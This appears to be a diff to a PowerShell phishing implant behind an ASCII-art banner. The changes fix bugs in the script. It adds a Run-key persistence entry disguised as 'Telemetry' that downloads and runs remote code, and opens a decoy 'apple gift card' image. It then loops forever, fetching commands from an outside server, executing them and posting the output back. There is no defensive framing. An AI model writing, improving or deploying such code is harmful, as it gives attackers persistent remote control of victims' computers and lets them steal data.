@@ -1,5 +1,6 @@
 # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                               #  
+#                                               #  
 # /     \             \            /    \       #
 #|       |             \          |      |      #
 #|       `.             |         |       :     #
@@ -41,15 +42,17 @@
 $beacon = 'http://capablanca.pythonanywhere.com/cmd';
 $result = 'http://capablanca.pythonanywhere.com/rsp';
 
-
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Telemetry" -Value "powershell.exe -command `"iex (Invoke-WebRequest 'http://solem.dev/phishbait/agent.ps1').Content`""
-Write-Host (Invoke-WebRequest 'http://solem.dev/phishbait/apple_giftcard.png').Content | Out-File -FilePath C:\Windows\Temp\apple_giftcard.png
-Invoke-Item C:\Windows\Temp\apple_giftcard.png
+Set-Variable ProgressPreference SilentlyContinue
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Telemetry" -Value "powershell.exe -command `"iex [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest 'http://solem.dev/phishbait/agent.ps1').Content)`""
+Set-Content ($env:USERPROFILE+"\AppData\Local\Temp\apple_giftcard.png") -Value ((Invoke-WebRequest 'http://solem.dev/phishbait/apple_giftcard.png').Content) -Encoding Byte
+Start-Sleep -Seconds 2;
+Invoke-Item ($env:USERPROFILE+"\AppData\Local\Temp\apple_giftcard.png")
 while ($true){
     $command = (Invoke-WebRequest $beacon).Content;
     if($command -ne ""){
-        $out = @(iex $command);
-        Invoke-WebRequest $result + '/' + [Convert]::ToBase64String($result);
-        Start-Sleep -Seconds 10;
+        $out = @(Invoke-Expression $command);
+        Invoke-WebRequest -Uri ($result) -Method POST -Body ("data="+$out);
+        
     }
+    Start-Sleep -Seconds 10;
 }
